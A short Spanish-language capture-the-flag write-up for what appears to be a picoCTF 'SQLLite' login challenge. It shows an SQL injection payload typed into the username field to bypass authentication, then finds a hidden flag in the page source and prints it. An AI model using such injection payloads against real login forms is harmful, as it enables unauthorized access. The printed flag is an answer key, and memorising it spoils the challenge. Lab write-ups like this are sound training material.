# SQLLite
Can you login to this website?

Hints:
- `admin` is the user you want to login as.

## Solución
Primero nos conectamos a la base de datos, depués nod dirigiremos a la página que se nos esta indicando, dentro de ella nos pide que agreguemos un username y un password, justo aquí podemos hacer una inyección en el campo username

```
username: admin ' OR '1=1';
password: admin
SQL query: SELECT * FROM users WHERE name='admin ' OR '1=1';' AND password='admin'
```

logrando logearnos, pero nos indica otra cosa

```
# Logged in! But can you see the flag, it is in plainsight.
```

Entonces es aquí donde **vemos el código fuente de la página** y encontraremos la bandera

``` html
<pre>username: admin &#039; OR &#039;1=1&#039;;
password: admin
SQL query: SELECT * FROM users WHERE name=&#039;admin &#039; OR &#039;1=1&#039;;&#039; AND password=&#039;admin&#039;
</pre><h1>Logged in! But can you see the flag, it is in plainsight.</h1><p hidden>Your flag is: picoCTF{L00k5_l1k3_y0u_solv3d_it_9b0a4e21}</p>
```

Bandera:
picoCTF{L00k5_l1k3_y0u_solv3d_it_9b0a4e21}